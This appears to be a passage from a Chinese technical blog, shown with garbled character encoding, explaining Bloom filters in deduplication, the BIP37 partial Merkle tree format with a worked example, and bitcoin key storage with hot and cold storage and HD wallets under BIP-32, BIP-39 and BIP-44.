<p>è¿™é‡Œä¸¾ä¾‹åˆ†æä¸€ä¸‹Bloom filteråœ¨é‡å¤æ•°æ®åˆ é™¤åº”ç”¨ä¸­çš„ç©ºé—´å’Œæ—¶é—´æ•ˆç‡ã€‚é‡å¤æ•°æ®åˆ é™¤æŠ€æœ¯çš„åŸºæœ¬åŸç†æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œå®šé•¿æˆ–å˜é•¿åˆ†å—ï¼Œç„¶ååˆ©ç”¨hashå‡½æ•°è®¡ç®—æ•°æ®å—æŒ‡çº¹ï¼Œå¦‚æœä¸¤ä¸ªæ•°æ®å—æŒ‡çº¹ç›¸åŒåˆ™è®¤ä¸ºæ˜¯é‡å¤æ•°æ®å—ï¼ˆå­˜åœ¨æ•°æ®ç¢°æ’é—®é¢˜ï¼‰ï¼Œåªä¿å­˜ä¸€ä¸ªæ•°æ®å—å‰¯æœ¬å³å¯ï¼Œå…¶ä»–ç›¸åŒæ•°æ®å—ä½¿ç”¨è¯¥å‰¯æœ¬ç´¢å¼•å·è¡¨ç¤ºï¼Œä»è€Œå®ç°æ•°æ®ç¼©å‡å­˜å‚¨ç©ºé—´å¹¶æé«˜å­˜å‚¨æ•ˆç‡ã€‚</p>
<p>ä¸ºäº†æŸ¥è¯¢ä¸€ä¸ªæ•°æ®å—æ˜¯å¦é‡å¤æˆ–è€…å·²ç»å­˜åœ¨ï¼Œéœ€è¦è®¡ç®—æ•°æ®å—æŒ‡çº¹å¹¶è¿›è¡ŒæŸ¥æ‰¾ï¼Œå¹¶è®°å½•æ‰€æœ‰å”¯ä¸€æ•°æ®å—çš„æŒ‡çº¹ã€‚ä¸¾ä¸€ä¸ªä¾‹å­ï¼š32TBçš„æ•°æ®ï¼Œå¹³å‡æ•°æ®å—å¤§å°ä¸º8KBï¼Œæ¯ä¸ªæ•°æ®å—ä½¿ç”¨MD5å’ŒSHA1è®¡ç®—ä¸¤ä¸ªæŒ‡çº¹å¹¶ç”¨64ä½æ•´æ•°è¡¨ç¤ºå”¯ä¸€å—å·åˆ™å…±å ç”¨44å­—èŠ‚((128+160+64)&#x2F;8ï¼‰ï¼Œåˆ™æ€»å…±æœ€å¤šéœ€è¦176GBï¼ˆ32TB&#x2F;8KB * 44 Byteï¼‰çš„å­˜å‚¨ç©ºé—´æ¥ä¿å­˜æ•°æ®å—ä¿¡æ¯ã€‚</p>
<p>ç°åœ¨çš„å»é‡ç³»ç»Ÿæ•°æ®å®¹é‡é€šå¸¸å¤šè¾¾æ•°ååˆ°æ•°ç™¾TBï¼Œå¦‚æœæŠŠæ•°æ®å—ä¿¡æ¯å…¨éƒ¨ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œæ˜¾ç„¶å¯¹å†…å­˜çš„éœ€æ±‚é‡éå¸¸å·¨å¤§ã€‚é€šå¸¸çš„åšæ³•æ˜¯æŠŠæ•°æ®å—ä¿¡æ¯ä¿å­˜åœ¨ç£ç›˜æˆ–SSDä¸Šï¼Œä½¿ç”¨ä¸€å®šå†…å­˜é‡ä½œ Cacheç¼“å­˜æ•°æ®å—æŒ‡çº¹ï¼Œåˆ©ç”¨æ—¶é—´å±€éƒ¨æ€§å’Œç©ºé—´å±€éƒ¨æ€§æ¥æé«˜æŸ¥æ‰¾æ€§èƒ½ã€‚è¿™ç§æ–¹æ³•çš„ä¸€ä¸ªå…³é”®é—®é¢˜æ˜¯ï¼Œå¦‚æœæ–°çš„æ•°æ®å—æ˜¯ä¸é‡å¤çš„ï¼ŒæŸ¥æ‰¾æ—¶ä¼šå‡ºç°Cacheä¸å‘½ä¸­ï¼Œä»è€Œå¼•èµ·å¤§é‡çš„ç£ç›˜è¯»å†™æ“ä½œã€‚ç”±äºç£ç›˜æˆ–SSDæ€§èƒ½è¦è¿œè¿œå°äºå†…å­˜çš„ï¼Œå¯¹æŸ¥æ‰¾æ€§èƒ½å½±å“éå¸¸å¤§ã€‚</p>
<p>Bloom filterå¯ä»¥æœ‰æ•ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒDataDomainä¸­çš„Summary Vectorå°±æ˜¯é‡‡ç”¨Bloom filteræ¥å®ç°çš„ã€‚å¯¹äºå‰é¢çš„ä¾‹å­ï¼Œä¸€ä¸ªæ•°æ®å—ç”¨3ä¸ªhashå‡½æ•°è®¡ç®—æŒ‡çº¹æœ€å¤šå ç”¨3ä¸ªä½ï¼Œåˆ™Bloom filterä»…éœ€è¦1.5GB &#x3D; 32TB&#x2F;8KB * 3 &#x2F;8 bytesçš„å†…å­˜ç©ºé—´ã€‚å¼•å…¥Bloom filteræœºåˆ¶åï¼Œå¯¹äºä¸€ä¸ªæ–°æ•°æ®å—ï¼Œé¦–å…ˆæŸ¥æ‰¾Bloom filterï¼Œå¦‚æœæœªå‘½ä¸­åˆ™è¯´æ˜è¿™æ˜¯ä¸€ä¸ªæ–°çš„å”¯ä¸€æ•°æ®å—ï¼Œç›´æ¥ä¿å­˜æ•°æ®å—å’Œå¹¶Cacheæ•°æ®å—ä¿¡æ¯å³å¯ï¼›å¦‚æœå‘½ä¸­ï¼Œåˆ™è¯´æ˜è¿™æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªé‡å¤æ•°æ®å—ï¼Œéœ€è¦é€šè¿‡è¿›ä¸€æ­¥çš„hashæˆ–treeæŸ¥æ‰¾è¿›è¡Œç¡®è®¤ï¼Œæ­¤æ—¶éœ€è¦Cacheä¸Diskè¿›è¡Œäº¤äº’ã€‚å—ç›ŠäºBloom filterä»¥åŠCacheï¼ŒDataDomainç³»ç»Ÿå¯ä»¥å‡å°‘99%çš„ç£ç›˜è®¿é—®ï¼Œä»è€Œåˆ©ç”¨å°‘é‡çš„å†…å­˜ç©ºé—´å¤§å¹…æé«˜äº†æ•°æ®å—æŸ¥é‡æ€§èƒ½ã€‚</p>
<p>æœ€åï¼šBIP37ä¸­ä»‹ç»äº†Merkleè·¯å¾„çš„æ„é€ ã€‚</p>
<h2 id="Partial-Merkle-branch-format"><a href="#Partial-Merkle-branch-format" class="headerlink" title="Partial Merkle branch format"></a>Partial Merkle branch format</h2><p>A <em>Merkle tree</em> is a way of arranging a set of items as leaf nodes of tree in which the interior nodes are hashes of the concatenations of their child hashes. The root node is called the <em>Merkle root</em>. Every Bitcoin block contains a Merkle root of the tree formed from the blocks transactions. By providing some elements of the trees interior nodes (called a <em>Merkle branch</em>) a proof is formed that the given transaction was indeed in the block when it was being mined, but the size of the proof is much smaller than the size of the original block.</p>
<h2 id="Constructing-a-partial-merkle-tree-object"><a href="#Constructing-a-partial-merkle-tree-object" class="headerlink" title="Constructing a partial merkle tree object"></a>Constructing a partial merkle tree object</h2><ul>
<li><p>Traverse the merkle tree from the root down, and for each encountered node:</p>
</li>
<li><ul>
<li><p>Check whether this node corresponds to a leaf node (transaction) that is to be included OR any parent thereof: </p>
</li>
<li><ul>
<li>If so, append a â€˜1â€™ bit to the flag bits ã€è¦ä¹ˆæ˜¯èŠ‚ç‚¹æœ¬èº«ï¼Œè¦ä¹ˆæ˜¯å…¶ç¥–å…ˆã€‘</li>
<li>Otherwise, append a â€˜0â€™ bit.</li>
</ul>
</li>
<li><p>Check whether this node is a internal node (non-leaf) AND is the parent of an included leaf node: ã€å¦‚æœæ˜¯èŠ‚ç‚¹ç¥–å…ˆï¼Œé‚£ä¹ˆæ‰ç»§ç»­å¤„ç†å…¶å­©å­ï¼›å¦åˆ™ï¼Œå­©å­è·³è¿‡ï¼›æ³¨æ„å¶å­èŠ‚ç‚¹ä¹Ÿéœ€è¦æ·»åŠ hashï¼Œå®é™…ä¸Šè¦å¤„ç†çš„å¶å­èŠ‚ç‚¹åªæœ‰ç›®æ ‡èŠ‚ç‚¹å’Œå®ƒçš„å…„å¼ŸèŠ‚ç‚¹ã€‘</p>
</li>
<li><ul>
<li><p>If so:</p>
</li>
<li><ul>
<li>Descend into its left child node, and process the subtree beneath it entirely (depth-first).</li>
<li>If this node has a right child node too, descend into it as well.</li>
</ul>
</li>
<li><p>Otherwise: append this nodeâ€™s hash to the hash list.</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>ã€è¿™æ®µçš„ç»“æœæ˜¯ï¼Œä»æ ¹å¾€ä¸‹éå†ï¼Œèƒ½å¤Ÿå°†éœ€è¦è¿”å›çš„Merkleè·¯å¾„çš„æ‰€æœ‰èŠ‚ç‚¹çš„flagè®¾ç½®ä¸º0ã€‘</p>
<h2 id="Parsing-a-partial-merkle-tree-object"><a href="#Parsing-a-partial-merkle-tree-object" class="headerlink" title="Parsing a partial merkle tree object"></a>Parsing a partial merkle tree object</h2><p>As the partial block message contains the number of transactions in the entire block, the shape of the merkle tree is known before hand. Again, traverse this tree, computing traversed nodeâ€™s hashes along the way:</p>
<ul>
<li><p>Read a bit from the flag bit list:</p>
</li>
<li><ul>
<li><p>If it is â€˜0â€™:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, and return it as this nodeâ€™s hash.</li>
</ul>
</li>
<li><p>If it is â€˜1â€™ and this is a leaf node:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, store it as a matched txid, and return it as this nodeâ€™s hash.</li>
</ul>
</li>
<li><p>If it is â€˜1â€™ and this is an internal node:</p>
</li>
<li><ul>
<li><p>Descend into its left child tree, and store its computed hash as L.</p>
</li>
<li><p>If this node has a right child as well:</p>
</li>
<li><ul>
<li>Descend into its right child, and store its computed hash as R.</li>
<li>If L &#x3D;&#x3D; R, the partial merkle tree object is invalid.</li>
<li>Return Hash(L || R).</li>
</ul>
</li>
<li><p>If this node has no right child, return Hash(L || L).</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>ã€è¿™æ®µæ˜¯å¯¹è¿”å›çš„Merkleè·¯å¾„ä¸Šçš„å“ˆå¸Œå€¼è¿›è¡Œå¤„ç†éªŒè¯ã€‘</p>
<p>The partial merkle tree object is only valid if:</p>
<ul>
<li>All hashes in the hash list were consumed and no more.</li>
<li>All bits in the flag bits list were consumed (except padding to make it into a full byte), and no more.</li>
<li>The hash computed for the root node matches the block headerâ€™s merkle root.</li>
<li>The block header is valid, and matches its claimed proof of work.</li>
<li>In two-child nodes, the hash of the left and right branches was never equal.</li>
</ul>
<p>ã€å…³äºä»¥ä¸Šç®—æ³•ï¼Œè®©äººéå¸¸è¿·æƒ‘çš„åœ°æ–¹åœ¨äºï¼Œå‡è®¾å¯¹æ ‘çš„ç»“æ„å·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œä¸ºä½•éœ€è¦å¦‚æ­¤éº»çƒ¦çš„ç®—æ³•ã€‚å‡è®¾åœ¨ä¸€æ£µæœ‰16ä¸ªå¶å­èŠ‚ç‚¹çš„æ»¡äºŒå‰æ ‘ä¸Šï¼Œé’ˆå¯¹ä»»ä½•ä¸€ä¸ªå¶å­éƒ½å¯ä»¥å¾ˆå®¹æ˜“ç®—å‡ºMerkleè·¯å¾„ï¼ˆç»™å®šç¼–å·ï¼‰ï¼›è€Œä¸”åœ¨è·å¾—Merkleè·¯å¾„çš„å“ˆå¸Œå€¼ä¹‹åï¼Œåªè¦ä»åå‘å‰ä¾æ¬¡åˆå¹¶è®¡ç®—å³å¯ï¼›è¿™æ˜¯2018å¹´æ—¶çš„è¿·æƒ‘ã€‘</p>
<p>çœ‹äº†ä¸¤å¹´ä¹‹åï¼Œç»ˆäºæ‚Ÿäº†ã€‚ä¸Šé¢çš„ç®—æ³•æœ¬èº«å°±æ˜¯åœ¨å¯¹æ ‘ç»“æ„å·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œåˆ¤æ–­ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦æ˜¯ç›®æ ‡èŠ‚ç‚¹çš„ç¥–å…ˆã€‚åŒæ—¶ï¼Œç»è¿‡ä¸€ééå†ï¼Œä¾¿è·å¾—æ‰€éœ€çš„ä¿¡æ¯ã€‚ã€ä¸€ä¸ªçŒœæƒ³æ˜¯ï¼Œè¿™é‡Œçš„æ•°æ®ç»“æ„æ˜¯KVç»“æ„ï¼Œä¸èƒ½åƒæ•°ç»„é‚£æ ·å¯ä»¥ç›´æ¥æ ¹æ®ä¸‹è¡¨ç´¢å¼•è·å¾—å†…å®¹ï¼›æ‰€ä»¥åªèƒ½é€šè¿‡éå†çš„æ–¹å¼è·å¾—ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯å¾—å»çœ‹æºç ã€‘</p>
<p>ç†ä¸€éè¿‡ç¨‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233049.jpg" alt="img"></p>
<p>ä»¥8ä¸ªäº¤æ˜“çš„æ»¡äºŒå‰æ ‘ä¸ºä¾‹ã€‚å‡è®¾æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç¬¬ä¸‰ä¸ªäº¤æ˜“ï¼Œä¹Ÿå³ä¸Šå›¾ä¸­çš„èŠ‚ç‚¹10ã€‚é‚£ä¹ˆæ ¹æ®ç®—æ³•ï¼Œæ·±åº¦ä¼˜å…ˆç®—æ³•éå†ï¼Œéœ€è¦å¤„ç†çš„èŠ‚ç‚¹æ˜¯1ã€2ã€4ã€5ã€10ã€11ã€3ï¼›è·å¾—çš„æ ‡è®°listæ˜¯1ã€1ã€0ã€1ã€1ã€0ã€0ï¼›è·å¾—çš„hashlistæ˜¯nullã€nullã€hashã€nullã€hashã€hashã€hashã€‚</p>
<p>åœ¨è¿›è¡Œè§£æçš„è¿‡ç¨‹ä¸­ï¼Œä»1å¼€å§‹ï¼Œè¿›å…¥å·¦èŠ‚ç‚¹ï¼Œæ‰¾åˆ°2ï¼Œ2å¯¹åº”çš„æ ‡è®°æ˜¯1å¹¶ä¸”æ˜¯å†…éƒ¨èŠ‚ç‚¹ï¼Œæ‰€ä»¥ç»§ç»­æ‰¾åˆ°4ï¼Œ4å¯¹åº”çš„æ ‡è®°æ˜¯0ï¼Œä»hashlistè¿”å›å“ˆå¸Œå€¼ï¼›æ¥ç€å¤„ç†5ï¼Œ5çš„æ ‡è®°æ˜¯1ä¸”æ˜¯å†…éƒ¨èŠ‚ç‚¹ï¼Œåˆ†åˆ«å¤„ç†10å’Œ11ï¼›10å’Œ11éƒ½è¿”å›å“ˆå¸Œå€¼ï¼Œä»è€Œå¯ä»¥è®¡ç®—å‡º5çš„å“ˆå¸Œå€¼ï¼›è·å¾—4å’Œ5çš„å“ˆå¸Œå€¼ä¹‹åï¼Œ2å¯ä»¥è®¡ç®—å¾—å‡ºå“ˆå¸Œå€¼ï¼›1çš„å·¦å­©å­å¤„ç†å®Œæˆï¼›æ¥ç€å¤„ç†3ï¼Œ3çš„æ ‡è®°æ˜¯0ï¼Œç›´æ¥è¿”å›å“ˆå¸Œå€¼ï¼Œä»è€Œå¯ä»¥è®¡ç®—å¾—å‡º1çš„å“ˆå¸Œå€¼ï¼Œä¹Ÿå°±æ˜¯merklerootã€‚æ­¤æ—¶å¯ä»¥å°†è¯¥è®¡ç®—ç»“æœä¸SPVå­˜å‚¨çš„åŒºå—å¤´ä¿¡æ¯è¿›è¡Œå¯¹æ¯”ã€‚</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://cloud.tencent.com/developer/article/1082346">ç†è§£åŒºå—é“¾èƒŒåçš„Merkle Tree</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.coingogo.com/article/1690">https://www.coingogo.com/article/1690</a></li>
<li><a href="https://link.zhihu.com/?target=http://haroldcarr.com/posts/2017-07-31-the-block-in-blockchain-merkle-trees.html">the block in blockchain explained (merkle trees)</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/merkle-patricia-tree-in-detail">å¹²è´§ | Merkle Patricia Tree è¯¦è§£</a></li>
<li><a href="https://link.zhihu.com/?target=https://shuwoom.com/?p=692">Merkleæ ‘å’ŒSPVæœºåˆ¶ | shuwoomçš„åšå®¢</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/1/master_bitcoin/_book/6/6.html">ç¬¬6ç«  æ¯”ç‰¹å¸ç½‘ç»œ Â· ç²¾é€šæ¯”ç‰¹å¸-å·´æ¯”ç‰¹å›¾ä¹¦</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/liuaigui/article/details/6602683">æ·±å…¥ç†è§£Bloom Filter</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/46b07467373a">https://www.jianshu.com/p/46b07467373a</a> ï¼ˆæœ‰ä»£ç ï¼‰</li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯10-å¦‚ä½•å­˜å‚¨å’Œä½¿ç”¨æ¯”ç‰¹å¸"><a href="#åŒºå—é“¾æŠ€æœ¯10-å¦‚ä½•å­˜å‚¨å’Œä½¿ç”¨æ¯”ç‰¹å¸" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯10:å¦‚ä½•å­˜å‚¨å’Œä½¿ç”¨æ¯”ç‰¹å¸"></a>åŒºå—é“¾æŠ€æœ¯10:å¦‚ä½•å­˜å‚¨å’Œä½¿ç”¨æ¯”ç‰¹å¸</h1><p>ç®¡ç†ç§é’¥éœ€è¦è€ƒè™‘ä¸‰ä¸ªç›®æ ‡ï¼Œæ‰€æœ‰å„ç§ä¿ç®¡å¯†é’¥çš„æ–¹æ³•å°±æ˜¯è¿™ä¸‰ä¸ªç›®æ ‡çš„æŠ˜ä¸­ï¼š</p>
<ol>
<li>å¯ç”¨æ€§ï¼šå½“éœ€è¦ä½¿ç”¨æ¯”ç‰¹å¸çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨å¾—ä¸Šï¼›</li>
<li>å®‰å…¨æ€§ï¼šä¿è¯å…¶ä»–äººä¸èƒ½ä½¿ç”¨ä½ çš„ç§é’¥ï¼›</li>
<li>æ–¹ä¾¿æ€§ï¼šç”¨çš„æ—¶å€™æ¯”è¾ƒç®€å•ã€‚</li>
</ol>
<p>æˆ‘ä»¬æ¥è€ƒè™‘ä¸‹ï¼Œå¦‚æœæŠŠå¯†é’¥å†™åœ¨çº¸ä¸Šï¼Œé‚£è€ƒè™‘åˆ°å¯ç”¨æ€§ï¼Œå°±éœ€è¦éšèº«æŠŠçº¸å¸¦åœ¨èº«ä¸Šï¼Œé‚£å®‰å…¨æ€§å°±ä¸ç”¨è¯´äº†ï¼Œæ–¹ä¾¿æ€§çš„è¯ï¼Œè¾“å…¥èµ·æ¥ä¹Ÿä¸æ–¹ä¾¿ã€‚ä¿å­˜åœ¨ç”µè„‘ä¸Šä¹ŸåŒæ ·çš„é—®é¢˜ï¼Œå¦‚æœç”µè„‘è¢«å·äº†ï¼Œæˆ–è€…è¯´ç”µè„‘å´©æºƒäº†ï¼Œé‚£æ‰€æœ‰çš„é’±éƒ½æ²¡äº†ï¼›å¦‚æœæœ‰äººé»‘è¿›äº†ä½ çš„ç”µè„‘ï¼Œæ‰€æœ‰çš„å¸ä¹Ÿéƒ½æ²¡äº†ã€‚</p>
<p>æ‰€ä»¥æŠŠç§é’¥ä¿å­˜åœ¨æœ¬åœ°æœºå™¨ä¸Šï¼Œç‰¹åˆ«æ˜¯ç§»åŠ¨è®¾å¤‡ä¸Šï¼Œç›¸å½“äºæŠŠæ‰€æœ‰çš„é’±éƒ½è£…åœ¨é’±åŒ…é‡Œå¸¦åœ¨èº«ä¸Šã€‚å¦‚æœæ‰‹æœºä¸¢äº†ï¼Œæ‰€æœ‰çš„æ¯”ç‰¹å¸ä¹Ÿéƒ½ä¸¢äº†ã€‚</p>
<p>ï¼ˆç°åœ¨æœ‰å¾ˆå¤šé’±åŒ…è½¯ä»¶å’Œç¡¬ä»¶ï¼Œå¸®å¿™ç®¡ç†ç§é’¥ï¼Œç‰¹åˆ«æ˜¯ç”¨æˆ·æœ‰å¤šä¸ªè´¦æˆ·æ—¶ï¼Œä½¿ç”¨é’±åŒ…å¸®å¿™ç®¡ç†æ˜¯éå¸¸æœ‰æ•ˆçš„ã€‚è€Œä¸”é’±åŒ…è½¯ä»¶å¯ä»¥å¸®å¿™æ–¹ä¾¿åœ°æŸ¥çœ‹ä½™é¢å’Œäº¤æ˜“ç­‰ä¿¡æ¯ã€‚ï¼‰</p>
<p>å°†å¯†é’¥å­˜åœ¨ç§»åŠ¨è®¾å¤‡å°±åƒæŠŠé’±å¸¦åœ¨èº«ä¸Šï¼Œæ–¹ä¾¿ä½¿ç”¨ä½†æ˜¯å®‰å…¨æ€§ä¸ä½³ï¼Œè¿™ç§æ–¹å¼å«åšâ€œHot strorageâ€ï¼›å¦ä¸€ç§æ–¹å¼æ˜¯å°†å¯†é’¥é”èµ·æ¥ï¼Œä¸ä¸Šç½‘ï¼Œç”¨èµ·æ¥ä¸æ–¹ä¾¿ï¼Œä½†æ˜¯å¾ˆå®‰å…¨ï¼Œè¿™ç§å«åšâ€œcold storageâ€ï¼ˆå°†ç»è¿‡PassphraseåŠ å¯†åçš„ç§é’¥å†™åœ¨çº¸ä¸Šæ˜¯ä¸é”™çš„æ–¹æ³•ï¼‰ã€‚ä¿å­˜çº¸å¸æ—¶æˆ‘ä»¬æ­£å¸¸çš„åšæ³•æ˜¯å¸¦ç‚¹é›¶é’±åœ¨èº«ä¸Šï¼Œç„¶åå°†å¤§éƒ¨åˆ†çš„ç§¯è“„æ”¾åœ¨é“¶è¡Œé‡Œã€‚ä¹Ÿå³hot storageå’Œcold storageç›¸ç»“åˆã€‚</p>
<p>æ‰€ä»¥ï¼Œå¾ˆæ˜æ˜¾ï¼Œéœ€è¦å¯¹Hot storageå’Œcold storageå‡†å¤‡ä¸åŒçš„å¯†é’¥ã€‚å¦åˆ™ï¼Œåˆ†å¼€å­˜å‚¨å°±æ²¡æœ‰ä»»ä½•æ„ä¹‰äº†ã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œä¸ºäº†æ›´å¥½çš„åŒ¿åæ€§ï¼Œä¹Ÿéœ€è¦æ›´å¤šçš„å…¬ç§é’¥å¯¹ï¼Œè­¬å¦‚æœ€å¥½æ˜¯ä¸€ç¬”äº¤æ˜“æ¢ä¸€ä¸ªåœ°å€ã€‚è‡ªç„¶ï¼Œå‚¬ç”Ÿå‡ºä¸€ç§éœ€æ±‚ï¼Œå°±æ˜¯æ‰¹é‡ç”Ÿæˆå¯†é’¥ã€‚</p>
<h2 id="éç¡®å®šæ€§é’±åŒ…"><a href="#éç¡®å®šæ€§é’±åŒ…" class="headerlink" title="éç¡®å®šæ€§é’±åŒ…"></a>éç¡®å®šæ€§é’±åŒ…</h2><p><strong>ä¹‹æ‰€ä»¥å«éç¡®å®šæ€§é’±åŒ…ï¼Œä¸»è¦å› ä¸ºè¿™ç§é’±åŒ…ç”Ÿæˆçš„ç§é’¥ï¼Œäº’ç›¸ä¹‹é—´æ˜¯æ²¡æœ‰ä»»ä½•å…³ç³»çš„ï¼Œæ¯ä¸ªç§é’¥éƒ½æ˜¯ç‹¬ç«‹çš„ã€‚</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233050.jpg" alt="img">é›¶å‹éç¡®å®šæ€§é’±åŒ…ç¤ºæ„å›¾</p>
<h2 id="ç¡®å®šæ€§é’±åŒ…"><a href="#ç¡®å®šæ€§é’±åŒ…" class="headerlink" title="ç¡®å®šæ€§é’±åŒ…"></a>ç¡®å®šæ€§é’±åŒ…</h2><p>ç¬¬äºŒç§ç±»å‹æ˜¯ç¡®å®šæ€§é’±åŒ…ï¼ˆdeterministic walletï¼‰ï¼Œå…¶ä¸­æ‰€æœ‰çš„å¯†é’¥éƒ½æ˜¯ä»ä¸€ä¸ªä¸»å¯†é’¥æ´¾ç”Ÿå‡ºæ¥ï¼Œè¿™ä¸ªä¸»å¯†é’¥å³ä¸ºç§å­ï¼ˆseedï¼‰ã€‚è¯¥ç±»å‹é’±åŒ…ä¸­æ‰€æœ‰å¯†é’¥éƒ½ç›¸äº’å…³è”ï¼Œå¦‚æœæœ‰åŸå§‹ç§å­ï¼Œåˆ™å¯ä»¥å†æ¬¡ç”Ÿæˆå…¨éƒ¨å¯†é’¥ã€‚ç¡®å®šæ€§é’±åŒ…ä¸­ä½¿ç”¨äº†è®¸å¤šä¸åŒçš„å¯†é’¥æ¨å¯¼æ–¹æ³•ã€‚æœ€å¸¸ç”¨çš„æ¨å¯¼æ–¹æ³•æ˜¯ä½¿ç”¨æ ‘çŠ¶ç»“æ„ï¼Œç§°ä¸ºåˆ†çº§ç¡®å®šæ€§é’±åŒ…æˆ–HDé’±åŒ…ã€‚ç¡®å®šæ€§é’±åŒ…ç”±ç§å­è¡ç”Ÿåˆ›é€ ã€‚ä¸ºäº†ä¾¿äºä½¿ç”¨ï¼Œç§å­è¢«ç¼–ç ä¸ºè‹±æ–‡å•è¯ï¼Œä¹Ÿç§°ä¸ºåŠ©è®°è¯ã€‚</p>
<h3 id="HDé’±åŒ…"><a href="#HDé’±åŒ…" class="headerlink" title="HDé’±åŒ…"></a>HDé’±åŒ…</h3><p>ä¸‹åˆ— BIP å…±åŒå®šä¹‰äº†ä¸€ç§ç¡®å®šæ€§é’±åŒ…çš„å®ç°ï¼Œè¿™ç§é’±åŒ…è¢«ç§°ä¸ºåˆ†å±‚ç¡®å®šæ€§ï¼ˆHDï¼ŒHierarchical Deterministicï¼‰é’±åŒ…ã€‚</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a>ï¼ŒHD é’±åŒ…ä¸­çš„å¯†é’¥å¦‚ä½•è¡ç”Ÿ</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki">BIP-39</a>ï¼ŒHD é’±åŒ…åŠ©è®°è¯ï¼ˆMnemonicï¼‰å’Œç§å­ï¼ˆSeedï¼‰çš„åˆ›å»ºè§„åˆ™</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki">BIP-44</a>ï¼Œæ”¯æŒå¤šå¸ç§å’Œå¤šè´¦æˆ·çš„ HD é’±åŒ…</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0043.mediawiki">BIP-43</a>ï¼Œå¤šç”¨é€”ï¼ˆpurposeï¼‰HD é’±åŒ…çš„ç»“æ„å®šä¹‰</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a>ï¼Œé€šè¿‡ P2SH å®ç°å¤šç­¾çš„ HD é’±åŒ…</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233051.jpg" alt="img">HDå‹é’±åŒ…ç¤ºæ„å›¾</p>
<p>BIP-32&#x2F;BIP-44</p>
<p>BIP-32æ ‡å‡†å®šä¹‰äº†HDé’±åŒ…ã€‚HDé’±åŒ…åŒ…å«ä»¥æ ‘çŠ¶ç»“æ„è¡ç”Ÿçš„å¯†é’¥ï¼Œä½¿å¾—çˆ¶å¯†é’¥å¯ä»¥è¡ç”Ÿä¸€ç³»åˆ—å­å¯†é’¥ï¼Œæ¯ä¸ªå­å¯†é’¥ä¹Ÿå¯ä»¥è¡ç”Ÿå‡ºä¸€ç³»åˆ—å­™å¯†é’¥ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233052.jpg" alt="img"></p>
<p>HDé’±åŒ…æœ‰ä¸¤ä¸ªä¸»è¦çš„ä¼˜åŠ¿ã€‚ç¬¬ä¸€ï¼Œæ ‘çŠ¶ç»“æ„å¯ä»¥è¢«ç”¨æ¥è¡¨è¾¾é¢å¤–çš„ç»„ç»‡å«ä¹‰ã€‚æ¯”å¦‚å½“ä¸€ä¸ªç‰¹å®šåˆ†æ”¯çš„å­å¯†é’¥è¢«ç”¨æ¥æ¥æ”¶äº¤æ˜“æ”¶å…¥å¹¶ä¸”æœ‰å¦ä¸€ä¸ªåˆ†æ”¯çš„å­å¯†é’¥ç”¨æ¥è´Ÿè´£æ”¯ä»˜èŠ±è´¹ã€‚ä¸åŒåˆ†æ”¯çš„å¯†é’¥éƒ½å¯ä»¥è¢«ç”¨åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œè¿™å°±å¯ä»¥æ”¯é…ä¸åŒçš„åˆ†æ”¯éƒ¨é—¨ã€å­å…¬å¸ã€å…·ä½“åŠŸèƒ½ä»¥åŠä¼šè®¡ç±»åˆ«ã€‚ç¬¬äºŒï¼Œç”¨æˆ·å¯ä»¥å»ºç«‹ä¸€ä¸ªå…¬é’¥çš„åºåˆ—è€Œä¸éœ€è¦è®¿é—®ç›¸å¯¹åº”çš„ç§é’¥ã€‚æ‰€ä»¥HDé’±åŒ…åœ¨ä¸å®‰å…¨çš„æœåŠ¡å™¨ä¸­ä½¿ç”¨æˆ–è€…åœ¨æ¯ç¬”äº¤æ˜“ä¸­å‘è¡Œä¸åŒçš„å…¬é’¥ã€‚å…¬é’¥ä¸éœ€è¦è¢«é¢„å…ˆåŠ è½½æˆ–è€…æå‰è¡ç”Ÿï¼Œè€Œåœ¨æœåŠ¡å™¨ä¸­ä¸éœ€è¦å¯ç”¨æ¥æ”¯ä»˜çš„ç§é’¥ã€‚</p>
